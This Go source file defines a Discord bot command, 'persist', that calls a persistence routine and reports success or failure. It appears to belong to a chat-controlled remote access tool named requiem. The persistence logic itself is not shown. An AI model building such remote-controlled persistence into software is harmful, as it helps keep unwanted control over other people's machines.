package commands

import (
	"requiem/persistence"

	"github.com/bwmarrin/discordgo"
)

func (*PersistCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	persisted := persistence.Persist("")
	if persisted {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully persisted.", msg.Reference())
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to persist.", msg.Reference())
	}
}

func (*PersistCommand) Name() string {
	return "persist"
}

func (*PersistCommand) Info() string {
	return "Re-persists requiem if it was disabled."
}

type PersistCommand struct{}
